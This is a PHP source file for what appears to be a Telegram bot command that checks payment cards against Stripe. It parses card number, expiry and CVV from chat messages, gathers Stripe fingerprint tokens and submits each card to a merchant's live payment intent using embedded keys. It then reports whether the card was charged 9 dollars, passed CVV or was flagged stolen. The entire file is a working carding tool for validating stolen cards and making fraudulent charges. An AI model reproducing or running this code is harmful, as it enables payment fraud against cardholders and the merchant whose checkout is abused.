<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        

            ###CHECKER PART###  
            $zip = rand(10001,90045);
            $time = rand(30000,699999);
            $rand = rand(0,99999);
            $pass = rand(0000000000,9999999999);
            $email = substr(md5(mt_rand()), 0, 7);
            $name = substr(md5(mt_rand()), 0, 7);
            $last = substr(md5(mt_rand()), 0, 7);
        
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: m.stripe.com',
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.5',
            'Content-Type: text/plain;charset=UTF-8',
            'Origin: https://m.stripe.network',
            'Referer: https://m.stripe.network/inner.html'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            $res = curl_exec($ch);
            $muid = trim(strip_tags(capture($res,'"muid":"','"')));
            $sid = trim(strip_tags(capture($res,'"sid":"','"')));
            $guid = trim(strip_tags(capture($res,'"guid":"','"')));
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3LNOv3CPBTfxNhAO1oovvvkR/confirm');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: api.stripe.com',
            'Accept: application/json',
            'Accept-Language: en-US,en;q=0.5',
            'Accept-Encoding: gzip, deflate, br',
            'Origin: https://js.stripe.com',
            'Content-Type: application/x-www-form-urlencoded',
            'Referer: https://js.stripe.com/',
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: no-cors',
            'Sec-Fetch-Site: cross-site',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=$name+$last&payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=13th+Ave+Street&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=$zip&payment_method_data[billing_details][address][state]=&payment_method_data[card][number]=$cc&payment_method_data[card][cvc]=$cvv&payment_method_data[card][exp_month]=$mes&payment_method_data[card][exp_year]=$ano&payment_method_data[guid]=$guid&payment_method_data[muid]=$muid&payment_method_data[sid]=$sid&payment_method_data[payment_user_agent]=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&payment_method_data[time_on_page]=$time&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51GtEAVCPBTfxNhAOgG5TfwPQRmY59A8HluifMEKkTlNonq23OrPPKMTP1qnUJBcCUGqTn6CSlQbMsFRZPo8mD5Ac00ETfGI9dH&client_secret=pi_3LNOv3CPBTfxNhAO1oovvvkR_secret_ZBrH6AcOGd6f41OWHwT8mRT9i');
            $result1 = curl_exec($ch);
            $info = curl_getinfo($ch);
            $time = $info['total_time'];
            $httpCode = $info['http_code'];
            $time = substr($time, 0, 4);

// Responses

if ((strpos($result1, 'incorrect_zip')) || (strpos($result1, 'Your card zip code is incorrect.')) || (strpos($result1, 'The zip code you supplied failed validation.'))){

sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Incorrect ZIP Code </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, '"cvc_check":"pass"')) || (strpos($result1, "Thank You.")) || (strpos($result1, '"status": "succeeded"')) || (strpos($result1, "Thank You For Donation.")) || (strpos($result1, "Your payment has already been processed")) || (strpos($result1, "Success ")) || (strpos($result1, '"type":"one-time"')) || (strpos($result1, "/donations/thank_you?donation_number="))){
sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Charged 9$.%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, 'Your card has insufficient funds.')) || (strpos($result1, 'insufficient_funds'))){
sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Insufficient Funds. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif ((strpos($result1, "Your card's security code is incorrect.")) || (strpos($result1, "incorrect_cvc")) || (strpos($result1, "The card's security code is incorrect."))){
sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Incorrect CVC. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CCN PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, "Your card does not support this type of purchase.")) || (strpos($result1, "transaction_not_allowed"))){
sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code> %0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Charge Rejected. </b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, "pickup_card")) || (strpos($result1, "lost_card")) || (strpos($result1, "stolen_card"))){
sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Pickup Card/Stolen Card. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>CVV PASS (✅)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif (strpos($result1, "do_not_honor")){
sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Do Not Honor. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, 'The card number is incorrect.')) || (strpos($result1, 'Your card number is incorrect.')) || (strpos($result1, 'incorrect_number'))){
sendMessage($chat_id , '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Your card number is incorrect. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>Incorrect (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif ((strpos($result1, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Expired Card. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>Expired (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}


elseif ((strpos($result1, "Your card was declined.")) || (strpos($result1, 'The card was declined.'))){
sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Your card was declined.</b> %0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif (strpos($result1, '"decline_code": "generic_decline"')){
sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Generic Decline. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Generic Decline. </b>%0A𝚂𝚃𝙰𝚃𝚄𝚂: <b>DECLINED (❌)</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, '"cvc_check":"unavailable"')) || (strpos($result1, '"cvc_check": "unchecked"')) || (strpos($result1, '"cvc_check": "fail"'))){
sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code>%0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: <b>Security Code Check : '.$cvc_check.' PROXY DEAD ❌</b>%0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif (strpos($result1, 'null')){
sendMessage($chat_id, '<b>𝐒𝐓𝐑𝐈𝐏𝐄 𝐂𝐇𝐀𝐑𝐆𝐄 - 𝟵$</b>%0A𝙲𝙰𝚁𝙳: <code>'.$lista.'</code> %0A BRAND: <b>'.$brand.'</b> %0A𝙲𝙾𝚄𝙽𝚃𝚁𝚈: <b>'.$name.'</b> %0A𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: <b>'.$currency.' - 💲</b> %0A MESSAGE: <b>GATE ERROR (❌)</b> %0A𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: <b>@'.$username.'</b> %0A𝚃𝙸𝙼𝙴 𝚃𝙾𝙾𝙺: <b>'.$time.'s</b>');
}

elseif ((strpos($result1, "missing input"))){
sendMessage($chat_id, '❌Invalid Command❌%0A❗️GATE CHK AUTH%0A❗️Example: /chk xxxxxxxxxxxxxxxx|xx|xx|xxx%0A❗️EX :- /chk 4010990064374103|09|2026|345');
}

elseif(!$result2){
sendMessage($chat_id, ''.$result2.'');
}else{
sendMessage($chat_id, ''.$result2.'');
}
curl_close($ch);
}
}
}
?>
